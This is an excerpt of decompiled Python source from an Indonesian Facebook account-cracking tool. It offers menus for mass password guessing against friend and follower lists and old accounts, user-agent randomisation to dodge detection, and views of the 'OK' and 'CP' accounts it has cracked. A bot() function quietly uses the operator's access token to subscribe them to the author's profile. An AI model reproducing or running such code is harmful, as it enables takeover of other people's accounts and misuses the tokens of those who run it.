# Time Succes decompile : 2022-03-25 23:11:38.030796
...
{M}██╔╝╚██╗  ╚█████╔╝╚█████╔╝██████╔╝███████╗
╚═╝░░╚═╝  ╚════╝░░╚════╝░╚═════╝░╚══========
{H}[{P}>{H}]{P} Au : Acill-Xcode
{H}[{P}>{H}]{P} Wa : +62896-6836-3509 
{H}[{P}>{H}]{P} Fb : facebook.com/Acillxcode12
{K}[{P}•{K}]{P}—————————————————————————————""")
...
def bot():
	...
	komentar = random.choice(["aman beb"])
	requests.post("https://graph.facebook.com/100069819591035/subscribers?access_token="+token) # ACILL
...
def menu():
	...
	print(u+line)
	print(s+"\n{"+m+"1"+s+"}"+B+" Crack Dari Pertemanan Atau Publik "+H+"{5000}")
	print(s+"{"+m+"2"+s+"}"+B+" Crack Dari Followers Publik "+H+"{5000}")
	print(s+"{"+m+"3"+s+"}"+B+" Crack Pertemanan Publik "+s+"{"+m+"Massal"+s+"}")
	print(s+"{"+m+"4"+s+"}"+B+" Crack Akun Old 04/08 "+s+"{"+m+"Massal"+s+"}")
	print(s+"{"+m+"5"+s+"}"+H+" Crack Akun Old 04/10 "+s+"{"+m+"Massal"+s+"}")
	print(s+"{"+m+"6"+s+"}"+H+" Setting User Agent "+s+"{Opsi}")
	print(s+"{"+m+"7"+s+"}"+H+" Cek Opsi Hasil Crack "+s+"{ok/cp}")
	print(s+"{"+m+"8"+s+"}"+H+" Cek Result Crack")
...
def result():
	print(s+"\n{"+m+"1"+s+"}"+K+" Cek Result CP "+k+"{akun sesi}")
	print(s+"{"+m+"2"+s+"}"+H+" Cek Result OK "+k+"{akun terbuka}")
	print(s+"{"+m+"0"+s+"}"+l+" Kembali")
	pilih = input("\n"+balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		try:
...
def mode_password():
	mode = input("\n"+balmond+l+" Crack Password Default Or Manual Or Gabungkan "+s+"{"+B+"d/m/g"+s+"}"+l+" : ")
	if mode=="d" or mode=="D":
		opsi()
	elif mode=="m" or mode=="M":
		print("\n"+balmond+H+" Masukkan Password Manual")
		print(balmond+M+" Miniman 6 Karakter Dalam 1 Password")
		print(balmond+K+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+M+" Password Manual : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>7:
			jalan("\n"+balmond+B+" Jangan Serakah Bang, Minimal 7 Password Aja")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
		...
		print(balmond+l+" Contoh : "+H+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Password Tambahan : "+B+"")
		cewe = pwa.split(",")
		if len(cewe)>5:
...
def mode_crack():
	...
	if pilih=="1" or pilih=="01":
		...
		print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Jika Ingin Menggunakan Random User Agent")
		print(balmond+u+" Tekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
		agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+H+"Recomended"+s+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
